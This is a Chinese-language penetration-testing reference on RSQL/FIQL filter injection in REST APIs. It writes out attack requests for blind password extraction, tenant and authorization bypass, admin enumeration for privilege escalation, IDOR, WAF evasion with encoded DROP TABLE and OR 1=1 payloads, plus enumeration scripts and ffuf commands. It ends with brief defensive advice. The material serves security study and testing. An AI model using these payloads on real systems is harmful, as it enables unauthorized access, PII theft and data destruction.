---
attack_surface: [注入类]
impact: [身份伪造, 权限提升, 信息泄露]
risk_level: 高
prerequisites:
  - SQL/NoSQL 基础
  - REST API 过滤语法理解
  - FIQL/RSQL 规范概念
difficulty: 中级
related_techniques:
  - sql-injection
  - orm-injection
  - nosql-injection
  - ssrf-server-side-request-forgery
tools:
  - Burp Suite
  - curl
  - pyrsql
---

# RSQL/FIQL Injection — REST API 过滤语言注入

> 关联文档：[SQL Injection](../SQL%20Injection/README.md) · [ORM Injection](../ORM%20Injection/README.md) · [NoSQL Injection](../NoSQL%20Injection/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 RSQL / FIQL

RSQL（RESTful Service Query Language）是 FIQL（Feed Item Query Language，RFC draft）的超集，用于在 REST API 的 query string 中表达复杂的过滤条件。格式为：

```
GET /api/users?filter=name=="admin";age=gt=18
#                          |              |
#                    RSQL 等于表达式    RSQL 大于表达式
```

## 1.2 RSQL 操作符速查

| 操作符 | 语义 | 示例 | SQL 等价 |
|--------|------|------|----------|
| `==` | 等于 | `name==admin` | `WHERE name = 'admin'` |
| `!=` | 不等于 | `role!=guest` | `WHERE role != 'guest'` |
| `=gt=` / `>` | 大于 | `age=gt=18` | `WHERE age > 18` |
| `=ge=` / `>=` | 大于等于 | `age=ge=18` | `WHERE age >= 18` |
| `=lt=` / `<` | 小于 | `age=lt=65` | `WHERE age < 65` |
| `=le=` / `<=` | 小于等于 | `age=le=65` | `WHERE age <= 65` |
| `=in=` | 包含于 | `id=in=(1,2,3)` | `WHERE id IN (1,2,3)` |
| `=out=` | 不包含于 | `status=out=(deleted)` | `WHERE status NOT IN ('deleted')` |
| `=like=` | LIKE 模式 | `name=like=*admin*` | `WHERE name LIKE '%admin%'` |
| **Logic AND** | `;` (分号) | `a==1;b==2` | `WHERE a=1 AND b=2` |
| **Logic OR** | `,` (逗号) | `a==1,b==2` | `WHERE a=1 OR b=2` |
| **Grouping** | `(` / `)` | `(a==1;b==2),c==3` | `WHERE (a=1 AND b=2) OR c=3` |

## 1.3 为什么会发生漏洞

RSQL 解析器将用户提供的 filter 字符串解析为 AST 后映射到后端数据存储（SQL/NoSQL/内存），核心风险在于：

1. **字段白名单缺失** — 允许过滤任意字段（如 `password==hunter2`）
2. **操作符未限制** — 允许 `=regex=` / `=like=` 等高成本操作符
3. **关系遍历未限制** — 允许 `nested.field==value` 跨越对象边界
4. **特殊字符未消毒** — RSQL 特殊字符（`'`、`(`、`)`、`*`）在 SQL 上下文中具有意义
5. **聚合/函数未限制** — 某些框架允许 `=func=` 调用后端函数

## 1.4 RSQL 复杂查询示例

```bash
# 基础 AND/OR 组合
name=="Kill Bill";year=gt=2003
name=="Kill Bill" and year>2003

# 括号分组 + =in= + 通配符
genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000

# 关系遍历 + 多条件范围
director.lastName==Nolan;year=ge=2000;year=lt=2010
director.lastName==Nolan and year>=2000 and year<2010

# =in= + =out= 组合 + OR
genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino
```

> 参考：[rsql-parser (Java)](https://github.com/jirutka/rsql-parser) 和 [MOLGENIS](https://molgenis.gitbooks.io/molgenis/content/) 文档

## 1.5 常见 API 过滤参数

API 端点常用的过滤/控制参数，均为潜在注入点：

**Filter 维度**：

| Filter | 说明 | 示例 |
|--------|------|------|
| `filter[users]` | 按特定用户过滤 | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | 按状态过滤 | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | 日期范围过滤 | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | 按分类过滤 | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | 按 ID 过滤 | `/api/v2/posts?filter[id]=42` |

**响应控制参数**：

| 参数 | 说明 | 示例 |
|------|------|------|
| `include` | 包含关联资源 | `/api/v2/orders?include=customer,items` |
| `sort` | 排序（- 降序） | `/api/v2/users?sort=-created_at` |
| `page[size]` | 每页结果数 | `/api/v2/products?page[size]=10` |
| `page[number]` | 页码 | `/api/v2/products?page[number]=2` |
| `fields[resource]` | 返回字段 | `/api/v2/users?fields[users]=id,name,email` |
| `search` | 全文搜索 | `/api/v2/posts?search=technology` |

**关键风险**：`include` 参数可暴露关联资源中的敏感字段；`fields` 参数可控制返回列（类似 SQL `SELECT` 注入）；`filter` + `include` 组合可实现跨用户数据访问。

---

# 0x02 信息泄露攻击

## 2.1 任意字段过滤

RSQL 最直接的漏洞是允许过滤未授权的字段：

```http
# 正常请求 — 过滤公开字段
GET /api/users?filter=username==john&department==engineering

# 攻击请求 — 过滤敏感字段
GET /api/users?filter=password==hunter2
# → 如果返回匹配用户 → Leak: 存在密码为 hunter2 的用户

# 布尔盲注 — 逐字符提取密码
GET /api/users?filter=password=like=a*          → 404 → 无匹配
GET /api/users?filter=password=like=ad*         → 404 → 无匹配  
GET /api/users?filter=password=like=adm*        → 200 → ∃ 密码以 'adm' 开头
GET /api/users?filter=password=like=admi*       → 200
# ... → 提取完整密码哈希
```

## 2.2 关系遍历 (Nested Field Access)

```http
# 攻击请求 — 跨越对象边界
GET /api/users?filter=role.name==admin
# 如果 User → Role 是关系 → 绕过直接的 role 过滤

# 更危险的嵌套
GET /api/users?filter=manager.role.permissions=like=*admin*
# → 三层嵌套 → 暴露有 admin 权限经理的下属

# 额外信息泄露 — 搜索不存在的关系字段可能泄露 schema
GET /api/users?filter=secretToken==xxx
# → {"error": "Unknown field: secretToken"}
# → 泄露后端模型字段名
```

## 2.3 `=in=` 枚举攻击

```http
# 使用 =in= 操作符暴力枚举用户 ID
GET /api/users?filter=id=in=(1,2,3,4,5,...,1000)
# → 返回所有 ID 在此范围的用户 → 绕过逐个 ID 的速率限制

# 利用 ID 枚举进行信息泄露
# 请求1: GET /api/users?filter=id=in=(1,999)
# 请求2: GET /api/users?filter=id=in=(1,2,...,998)
# 响应大小差异 → 泄露是否存在 ID=999 的用户
```

## 2.4 注册端点 Oracle — 用户枚举实战

典型场景：注册页面通过 API 检查邮箱是否已存在。虽然预期格式是 `?email=<account>`，但后端同时接受 RSQL filter 语法：

**Step 1 — 正常请求返回布尔状态**：

```http
GET /api/registrations?email=test@test.com HTTP/1.1
Host: localhost:3000
Accept: application/vnd.api+json

# 响应 200 → {"data": {"attributes": {"tenants": []}}}
# 空 tenants → 邮箱不存在 / 未注册
```

**Step 2 — 注入 RSQL filter 替代简单 email 参数**：

```http
GET /api/registrations?filter[userAccounts]=email=='existing@domain.local' HTTP/1.1
Host: localhost:3000
Accept: application/vnd.api+json

# 响应 200 → 返回完整用户对象:
# {
#   "data": {
#     "id": "***",
#     "type": "UserAccountDTO",
#     "attributes": {
#       "email": "existing@domain.local",
#       "sub": "***",
#       "status": "ACTIVE",
#       "tenants": [{"id": "1"}]
#     }
#   }
# }
```

**Oracle 逻辑**：邮箱不存在 → 空 tenants/空 data；邮箱存在 → 返回完整 UserAccountDTO。响应差异即为逐字符枚举 Oracle——结合 `=like=` 或 `==` 通配符提取所有已注册邮箱。

---

# 0x03 权限提升与授权绕过

## 3.1 会话/租户隔离绕过

```http
# 正常: 应用只应显示当前租户的用户
GET /api/users?filter=tenantId==<current_tenant>
# 应用后端通常会强制添加 tenantId 过滤

# 攻击: 注入 =out= 操作符绕过租户过滤
GET /api/users?filter=tenantId=out=(1,2,3)
# → 如果后端拼接: WHERE tenantId=5 AND (tenantId NOT IN (1,2,3))
# → 绕过: 如果后端使用 OR 拼接或未正确分组

# 攻击: 注入多个条件覆盖原有的 WHERE
GET /api/users?filter=tenantId==1,token==admin
# → OR 条件: (tenantId == 1 OR token == admin)
# → 当原有过滤器是 AND 时可能绕过
```

## 3.2 操作符组合绕过

```http
# 利用 OR (逗号) 绕过字段白名单
GET /api/projects?filter=publicFlag==true,secretProjectFlag==true
# → OR: publicFlag == true OR secretProjectFlag == true
# → 即使你的 tenant 没有 secretFlag 项目，OR 返回了公开项目

# 利用括号组合
GET /api/projects?filter=(publicFlag==true;ownerId=gt=0),secretProjectFlag==true
# → (publicFlag AND ownerId > 0) OR secretProjectFlag == true
```

## 3.3 授权绕过 — 通配符盲注

当端点对无权限用户返回 403，但支持 RSQL filter 时，可用通配符绕过授权控制：

```http
# 低权限用户直接访问 → 403 Forbidden
GET /api/users HTTP/1.1
Authorization: Bearer <low_priv_token>
# 响应: HTTP/1.1 403 (Content-Length: 0)

# 注入 RSQL filter 通配符 → 200 OK + 完整用户列表
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Authorization: Bearer <low_priv_token>
# 响应: HTTP/1.1 200 (Content-Length: 1434192)
# → 返回所有 ID 中包含字母 "a" 的用户完整信息
# → 逐字母枚举可提取全部用户 PII
```

**关键机制**：`filter` 参数在授权检查之前被解析执行 → 即便用户无权访问 `/api/users`，RSQL 过滤器仍被应用到查询中 → 结果通过 filter 筛选后返回。"无权限"仅检查了是否允许无过滤查询，而非是否允许使用 filter。

## 3.4 权限提升 — 管理员 ID 枚举与角色替换

当可以从响应中识别管理员用户时（如 `include=role` 暴露了 role 字段）：

**Step 1 — 确认低权限身份**：

```http
GET /api/companyUsers?include=role HTTP/1.1
Authorization: Bearer <low_priv_token>
# 响应: {"data": []}  ← 无权限查看任何 company user
```

**Step 2 — 通过 RSQL filter 枚举管理员**：

```http
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='<admin_uuid>' HTTP/1.1
Authorization: Bearer <low_priv_token>
# 响应: {"data": [{
#   "attributes": {
#     "email": "admin@domain.local",
#     "userRole": {
#       "userRoleId": 1,
#       "userRoleKey": "general.roles.admin"
#     }
#   }
# }]}
```

**Step 3 — 替换 filter 中 user.id 为管理员 ID → 获取管理员权限**：

```http
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='<admin_uuid>' HTTP/1.1
Authorization: Bearer <low_priv_token>
# 响应: 返回全部功能权限列表 (68833 bytes)
# → 低权限用户以管理员身份获取所有功能权限
```

## 3.5 IDOR / 身份模拟 — `include` + `filter` 组合

利用 `include` 暴露关联资源 + `filter` 绕过所有权检查，读取任意用户资料：

```http
# 请求自己的资料（正常）
GET /api/users?include=language,country HTTP/1.1
Authorization: Bearer <my_token>
# 响应: 返回当前用户信息（email, firstName, mobilePhone ...）

# 注入 filter 读取其他用户资料（IDOR）
GET /api/users?include=language,country&filter[users]=id=='<other_user_uuid>' HTTP/1.1
Authorization: Bearer <my_token>
# 响应: 返回其他用户的完整 PII（email, phone, taxIdentifier ...）
```

**风险链**：`include` → 暴露关联对象中的敏感字段；`filter` → 绕过"只能看自己"的授权检查。两者组合 → 任意用户资料批量泄露。

---

# 0x04 WAF 绕过

## 4.1 特殊字符编码

RSQL 过滤器中的 `;`、`,`、`(`、`)` 在实际传输中的编码差异可被利用绕过 WAF：

```http
# 原始
GET /api/users?filter=name==x'; DROP TABLE users; --

# URL 编码绕过
GET /api/users?filter=name%3D%3Dx'%3B%20DROP%20TABLE%20users%3B%20--
# %3D = '=', %3B = ';'

# 双重编码绕过（如应用对 query string 做了两次解码）
GET /api/users?filter=name%253D%253Dx'%253B%20DROP%20TABLE%20users%253B%20--

# RSQL 内部的特殊字符转义
GET /api/users?filter=name=='x\'; DROP TABLE users; --'
# RSQL 中 '' 表示字面单引号 → 底层 SQL 仍可能被注入
```

## 4.2 `=like=` 与通配符 WAF 绕过

```http
# WAF 拦截 SELECT 关键字
GET /api/users?filter=name=like=*SEL*ECT*

# RSQL =like= 通配符
GET /api/users?filter=name=like=*admin*  # WAF 拦截 "admin"
GET /api/users?filter=name=like=*adm*in*  # 分段绕过

# 利用 RSQL 字符定义差异
# * (RSQL 通配符) != % (SQL 通配符)，但 WAF 可能不认识 RSQL 语法
```

---

# 0x05 框架特定攻击

## 5.1 Elide (Yahoo/JPA/JSON:API)

Elide 将 RSQL filter 直接转换为 JPA Criteria Query，攻击面更大：

```http
# Elide 关系注入
GET /api/v1/user?filter=user.role.name==admin
# → JPA: LEFT JOIN user.role → WHERE role.name = 'admin'

# Elide 聚合函数注入 (某些版本)
GET /api/v1/user?filter=user.role==isnull=true
# → 查询没有 role 的用户 → 绕过权限
```

## 5.2 JPA/JSON:API 通用

```http
# 利用 JSON:API 规范的 filter 参数
GET /api/users?filter[username]=admin&filter[password][$ne]=
# → 如果后端同时支持 JSON:API filter + RSQL → 双重注入可能

# 利用 JPA 属性图遍历
GET /api/users?filter=address.city.name==New+York
# → 如果 address 是实体 → 3 级 JOIN
```

## 5.3 `pyrsql` Python 构造器

```python
from pyrsql import RSQLBuilder

# 构造复杂 RSQL 注入 payload
builder = RSQLBuilder()
# 利用 pyrsql 生成编码后的 RSQL 字符串
payload = builder.encode("password=like=*admin*")
```

## 5.4 Elide / JPA → SQLi 联动

Elide 和 Spring Data REST 直接将 RSQL 翻译为 JPA Criteria。当开发者添加自定义操作符（如 `=ilike=`）并通过字符串拼接构建谓词时，可 pivot 到 SQLi：

```http
# RSQL 注入 → JPA Criteria → SQL 注入
GET /api/v1/user?filter=name=ilike='%%' OR 1=1--'
```

**CVE-2022-24827**：Elide analytic data store 接受参数化列——用户控制的 analytic params 与 RSQL filter 组合是 SQLi 的根因。即使补丁版本正确参数化，类似的定制代码仍常见——关注包含 `${}` 的 `@JoinFilter` / `@ReadPermission` SpEL 表达式，尝试注入 `';sleep(5);'` 或逻辑永真式。

## 5.5 JSON:API 关系过滤器绕过

JSON:API 后端通常同时暴露 `include` 和 `filter`。对关联资源的过滤可能在所有权检查之前执行：

```http
# 对关联资源过滤 → 绕过顶级 ACL
GET /api/orders?filter[orders]=customer.email==*admin*
# → 关系级 filter 在所有权验证前执行 → 泄露 admin 客户的订单
```

---

# 0x06 检测与自动化

## 6.1 操作符暴力探测

```python
import requests

operators = [
    "==", "!=", "=gt=", "=lt=", "=ge=", "=le=",
    "=in=", "=out=", "=like=", "=regex=", "=isnull=",
]

def test_rsql_operators(url, field="id"):
    for op in operators:
        r = requests.get(url, params={
            "filter": f"{field}{op}1"
        })
        print(f"  {op}: HTTP {r.status_code} "
              f"(len={len(r.text)}) "
              f"{'⚠ 可能与默认不同' if r.status_code != 200 else '✓'}")
```

## 6.2 字段枚举

```python
common_fields = [
    "password", "secret", "token", "key", "hash",
    "role", "permission", "isAdmin", "isStaff", "isSuperuser",
    "createdAt", "updatedAt", "deletedAt",
    "tenant", "organization", "company"
]

for field in common_fields:
    r = requests.get(url, params={"filter": f"{field}==xxx"})
    if "Unknown field" in r.text or "Unrecognized" in r.text:
        print(f"  [INFO] Field '{field}' does not exist")  # schema leak
    elif r.status_code in [200, 400]:
        print(f"  [FOUND] Field '{field}' exists and responded")
```

## 6.3 IDOR via `=in=` Parameter

```http
# 发现正常请求
GET /api/documents/123

# 尝试通过 RSQL filter 访问其他文档
GET /api/documents?filter=id=in=(124,125,126)
# → 返回多个文档 → IDOR + RSQL 联动

# 尝试 RSQL 获取全部文档
GET /api/documents?filter=id=gt=0
# → 绕过逐 ID 访问限制
```

## 6.4 Fuzzing 速查

```bash
# 1. 无害探针 → 确认 RSQL 支持
GET /api/x?filter=id==test
GET /api/x?q==test
GET /api/x?filter=id=foo=   # 畸形操作符 → 可能泄露解析器错误

# 2. 双重编码绕过简单黑名单和 WAF
GET /api/x?filter=id%2528admin%2529  # %25 = '%' → 双解码后 = (admin)

# 3. 通配符布尔盲注 → 比较响应大小
GET /api/users?filter[users]=email==*%@example.com;status==ACTIVE
GET /api/users?filter[users]=email==*%@other.com,status==ACTIVE  # OR 翻转逻辑

# 4. 范围泄露 → 无需知道确切 ID
GET /api/users?filter[users]=createdAt=rng=(2024-01-01,2025-01-01)
# → 按年份快速枚举，无需逐 ID 探测
```

## 6.5 自动化工具

**rsql-parser CLI (Java)** — 本地验证 payload、查看 AST，确保括号平衡：

```bash
java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"
```

**pyrsql Python 构造器** — 编程式生成 payload：

```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
# → email==*admin*;status==ACTIVE,role=in=(owner,admin)
```

**HTTP Fuzzer 配对** — 结合 ffuf / Turbo Intruder 遍历通配符位置：

```bash
# 在 =in= 列表中迭代通配符位置枚举 ID 和邮箱
ffuf -u "https://target/api/users?filter[users]=id=in=(*FUZZ*)" -w chars.txt
```

---

# 0x07 防御策略

1. **显式字段白名单**：
   ```python
   ALLOWED_RSQL_FIELDS = {'username', 'email', 'department', 'createdAt'}
   ALLOWED_RSQL_OPERATORS = {'==', '=in=', '=gt=', '=lt='}  # 禁止 =like=, =regex=
   ```

2. **关系深度限制**：禁止嵌套超过 1-2 层的关系过滤

3. **禁止危险操作符**：`=like=`、`=regex=`、`=isnull=` 默认关闭

4. **参数化查询**：RSQL → SQL 的转换必须使用 prepared statements

5. **速率限制**：对 `filter` 参数的请求速率限制比对普通请求更严格

---

# 0x08 参考资料

- [OWASP — RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [m3n0sd0n4ld — RSQL Injection Exploitation (实战)](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [HackTricks — RSQL Injection](https://book.hacktricks.xyz/pentesting-web/rsql-injection)
- [RSQL / FIQL Parser (Java)](https://github.com/jirutka/rsql-parser)
- [Elide — RSQL Filter & Security Considerations](https://elide.io/pages/guide/03-analytics.html)
- [pyrsql — Python RSQL Builder](https://github.com/pyrsql/pyrsql)
- [OData — $filter Conventions](https://docs.oasis-open.org/odata/odata/v4.0/errata03/os/complete/part2-url-conventions/odata-v4.0-errata03-os-part2-url-conventions-complete.html)
